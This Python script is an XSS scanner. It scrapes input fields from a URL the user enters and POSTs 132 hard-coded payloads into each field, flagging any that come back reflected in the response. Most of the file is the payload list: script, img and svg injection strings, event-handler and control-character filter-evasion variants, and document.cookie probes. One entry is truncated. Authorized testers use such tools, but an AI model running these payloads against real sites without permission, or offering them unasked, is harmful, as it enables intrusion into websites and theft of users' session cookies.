import requests
from bs4 import BeautifulSoup
from colorama import init, Fore

init(autoreset=True)

def find_input_fields(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        input_fields = soup.find_all('input')
        return [field.get('name') for field in input_fields]
    except Exception as e:
        print(f"Error occurred while fetching input fields from {url}: {e}")
        return []

def test_xss_vulnerability(url, field_name, payload, payload_name):
    try:
        response = requests.post(url, data={field_name: payload})
        if payload in response.text:
            print(Fore.GREEN + f"XSS vulnerability detected at: {url} for payload {payload_name} at input field {field_name}")
            return True
        else:
            print(Fore.YELLOW + f"No XSS vulnerability detected at: {url} for payload {payload_name} at input field {field_name}")
            return False
    except requests.RequestException as e:
        print(Fore.RED + f"Error occurred while testing {url}: {e}")
        return False

def main():
    target_url = input("Enter your target website URL: ")
    input_fields = find_input_fields(target_url)
    vulnerable_payloads = {}

    for field in input_fields:
        for payload_name, payload in xss_payloads.items():
            if test_xss_vulnerability(target_url, field, payload, payload_name):
                if payload_name not in vulnerable_payloads:
                    vulnerable_payloads[payload_name] = payload

    if not vulnerable_payloads:
        print(Fore.YELLOW + "No successful injection detected with existing payloads.")
        print(Fore.GREEN + "Generating new payloads...")

        # Generate new payloads
        new_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(\"XSS\")'/>",
            # more custom payloads to be added here
        ]

        for new_payload in new_payloads:
            for field in input_fields:
                if test_xss_vulnerability(target_url, field, new_payload, "New Payload"):
                    if "New Payload" not in vulnerable_payloads:
                        vulnerable_payloads["New Payload"] = new_payload
                    break  # Move to the next payload if one is successful

    if vulnerable_payloads:
        print(Fore.GREEN + "Successfully injected payloads:")
        for payload_name, payload in vulnerable_payloads.items():
            print(Fore.GREEN + f"Payload: {payload_name}, Value: {payload}")

        if not input_fields:
            print(Fore.RED + "No input fields found on the webpage. Exiting.")
            return

        print("Input fields found on the webpage:")
        for i, field in enumerate(input_fields):
            print(f"{i+1}. {field}")

xss_payloads = {
    "XSS1": "<script>alert('XSS')</script>",
    "XSS2": "<img src='x' onerror='alert(\"XSS\")'/>",
    "XSS3": "<svg/onload=alert('XSS')>",
    "XSS4": "<svg><script>alert('XSS')</script></svg>",
    "XSS5": "javascript:alert('XSS')",
    "XSS6": "><script>alert('XSS')</script><",
    "XSS7": "'-alert('XSS')-'",
    "XSS8": "<img src=\"javascript:alert('XSS');\">",
    "XSS9": "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "XSS10": "<img src=\"https://url.to.file.which/not.exist\" onerror=\"alert('XSS');\">",
    "XSS11": "<img src=\"https://url.to.file.which/exists\" onerror=\"alert(document.cookie);\">",
    "XSS12": "<script>alert(document.cookie)</script>",
    "XSS13": "<img src=x onerror=alert('XSS')>",
    "XSS14": "<img src=javascript:alert('XSS')>",
    "XSS15": "<img \"\"\"><script>alert('XSS')</script>\">",
    "XSS16": "<img src= onerror=alert('XSS')>",
    "XSS17": "-prompt(8)-",
    "XSS18": '-prompt(8)-',
    "XSS19": "\";a=prompt,a()//",
    "XSS20": "';a=prompt,a()//",
    "XSS21": "'-eval(\"window \")-'",
    "XSS22": "-eval(\"window \")-",
    "XSS23": "onclick=prompt(8)>\"@x.y",
    "XSS24": "onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
    "XSS25": "<image/src/onerror=prompt(8)>",
    "XSS26": "<img/src/onerror=prompt(8)>",
    "XSS27": "<image src/onerror=prompt(8)>",
    "XSS28": "<img src/onerror=prompt(8)>",
    "XSS29": "<image src =q onerror=prompt(8)>",
    "XSS30": "<img src =q onerror=prompt(8)>",
    "XSS31": "</scrip</script>t><img src =q onerror=prompt(8)>",
    "XSS32": "<script\x20type=\"text/javascript\">javascript:alert(1);</script>",
    "XSS33": "<script\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
    "XSS34": "<script\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
    "XSS35": "<script\x09type=\"text/javascript\">javascript:alert(1);</script>",
    "XSS36": "<script\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
    "XSS37": "<script\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
    "XSS38": "'`\"><\x3Cscript>javascript:alert(1)</script>",
    "XSS39": "'`\"><\x00script>javascript:alert(1)</script>",
    "XSS40": "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    "XSS41": "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
    "XSS42": "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
    "XSS43": "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
    "XSS44": "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
    "XSS45": "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
    "XSS46": "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
    "XSS47": "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
    "XSS48": "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
    "XSS49": "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>",
    "XSS50": "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>",
    "XSS51": "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>",
    "XSS52": "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>",
    "XSS53": "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>",
    "XSS54": "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
    "XSS55": "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>",
    "XSS56": "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>",
    "XSS57": "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>",
    "XSS58": "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>",
    "XSS59": "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>",
    "XSS60": "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>",
    "XSS61": "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>",
    "XSS62": "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",
    "XSS63": "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>",
    "XSS64": "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>",
    "XSS65": "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>",
    "XSS66": "<body onPageShow body onPageShow=\"javascript:javascript:alert(1)\"></body onPageShow>",
    "XSS67": "<style onReadyStateChange style onReadyState Change style on ReadyStateChange=""javascript:javascript:alert(1)""></style onReadyStateChange>",
    "XSS68": "<frameset onFocus frameset onFocus=\"javascript:javascript:alert(1)\"></frameset onFocus>",
    "XSS69": "<applet onError applet onError=\"javascript:javascript:alert(1)\"></applet onError>",
    "XSS70": "<marquee onStart marquee onStart=\"javascript:javascript:alert(1)\"></marquee onStart>",
    "XSS71": "<script onLoad script onLoad=\"javascript:javascript:alert(1)\"></script onLoad>",
    "XSS72": "<html onMouseOver html onMouseOver=\"javascript:javascript:alert(1)\"></html onMouseOver>",
    "XSS73": "<html onMouseEnter html onMouseEnter=\"javascript:parent.javascript:alert(1)\"></html onMouseEnter>",
    "XSS74": "<body onBeforeUnload body onBeforeUnload=\"javascript:javascript:alert(1)\"></body onBeforeUnload>",
    "XSS75": "<html onMouseDown html onMouseDown=\"javascript:javascript:alert(1)\"></html onMouseDown>",
    "XSS76": "<marquee onScroll marquee onScroll=\"javascript:javascript:alert(1)\"></marquee onScroll>",
    "XSS77": "<xml onPropertyChange xml onPropertyChange=\"javascript:javascript:alert(1)\"></xml onPropertyChange>",
    "XSS78": "<frameset onBlur frameset onBlur=\"javascript:javascript:alert(1)\"></frameset onBlur>",
    "XSS79": "<applet onReadyStateChange applet onReadyStateChange=\"javascript:javascript:alert(1)\"></applet onReadyStateChange>",
    "XSS80": "<svg onUnload svg onUnload=\"javascript:javascript:alert(1)\"></svg onUnload>",
    "XSS81": "<html onMouseOut html onMouseOut=\"javascript:javascript:alert(1)\"></html onMouseOut>",
    "XSS82": "<body onMouseMove body onMouseMove=\"javascript:javascript:alert(1)\"></body onMouseMove>",
    "XSS83": "<body onResize body onResize=\"javascript:javascript:alert(1)\"></body onResize>",
    "XSS84": "<object onError object onError=\"javascript:javascript:alert(1)\"></object onError>",
    "XSS85": "<body onPopState body onPopState=\"javascript:javascript:alert(1)\"></body onPopState>",
    "XSS86": "<html onMouseMove html onMouseMove=\"javascript:javascript:alert(1)\"></html onMouseMove>",
    "XSS87": "<applet onreadystatechange applet onreadystatechange=\"javascript:javascript:alert(1)\"></applet onreadystatechange>",
    "XSS88": "<body onpagehide body onpagehide=\"javascript:javascript:alert(1)\"></body onpagehide>",
    "XSS89": "<svg onunload svg onunload=\"javascript:javascript:alert(1)\"></svg onunload>",
    "XSS90": "<applet onerror applet onerror=\"javascript:javascript:alert(1)\"></applet onerror>",
    "XSS91": "<body onkeyup body onkeyup=\"javascript:javascript:alert(1)\"></body onkeyup>",
    "XSS92": "<body onunload body onunload=\"javascript:javascript:alert(1)\"></body onunload>",
    "XSS93": "<iframe onload iframe onload=\"javascript:javascript:alert(1)\"></iframe onload>",
    "XSS94": "<body onload body onload=\"javascript:javascript:alert(1)\"></body onload>",
    "XSS95": "<html onmouseover html onmouseover=\"javascript:javascript:alert(1)\"></html onmouseover>",
    "XSS96": "<object onbeforeload object onbeforeload=\"javascript:javascript:alert(1)\"></object onbeforeload>",
    "XSS97": "<body onbeforeunload body onbeforeunload=\"javascript:javascript:alert(1)\"></body onbeforeunload>",
    "XSS98": "<body onfocus body onfocus=\"javascript:javascript:alert(1)\"></body onfocus>",
    "XSS99": "<body onkeydown body onkeydown=\"javascript:javascript:alert(1)\"></body onkeydown>",
    "XSS100": "<iframe onbeforeload iframe onbeforeload=\"javascript:javascript:alert(1)\"></iframe onbeforeload>",
    "XSS101": "<iframe src iframe src=\"javascript:javascript:alert(1)\"></iframe src>",
    "XSS102": "<svg onload svg onload=\"javascript:javascript:alert(1)\"></svg onload>",
    "XSS103": "<html onmousemove html onmousemove=\"javascript:javascript:alert(1)\"></html onmousemove>",
    "XSS104": "<body onblur body onblur=\"javascript:javascript:alert(1)\"></body onblur>",
    "XSS105": "\x3Cscript>javascript:alert(1)</script>",
    "XSS106": '"`><script>/* *\x2Fjavascript:alert(1)// */</script>',
    "XSS107": "<script>javascript:alert(1)</script\x0D",
    "XSS108": "<script>javascript:alert(1)</script\x0A",
    "XSS109": "<script>javascript:alert(1)</script\x0B",
    "XSS110": "<script charset=\"\x22>javascript:alert(1)</script>",
    "XSS111": "<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->",
    "XSS112": "--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->",
    "XSS113": "--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->",
    "XSS114": "--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->",
    "XSS115": "--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->",
    "XSS116": '`"\'><img src=\'#\x27 onerror=javascript:alert(1)>',
    "XSS117": "<a href=\"javascript\x3Ajavascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS118": "'\"`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>",
    "XSS119": "<a href=\"javas\x00cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS120": "<a href=\"javas\x07cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS121": "<a href=\"javas\x0Dcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS122": "<a href=\"javas\x0Acript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS123": "<a href=\"javas\x08cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS124": "<a href=\"javas\x02cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS125": "<a href=\"javas\x03cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS126": "<a href=\"javas\x04cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS127": "<a href=\"javas\x01cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS128": "<a href=\"javas\x05cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS129": "<a href=\"javas\x0Bcript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS130": "<a href=\"javas\x09cript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
    "XSS131": "<a href=\"javas\x06cript:javascript:alert( 1) {",
    "XSS132": "<a href=\"javas\x0Ccript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
}
if __name__ == "__main__":
    main()
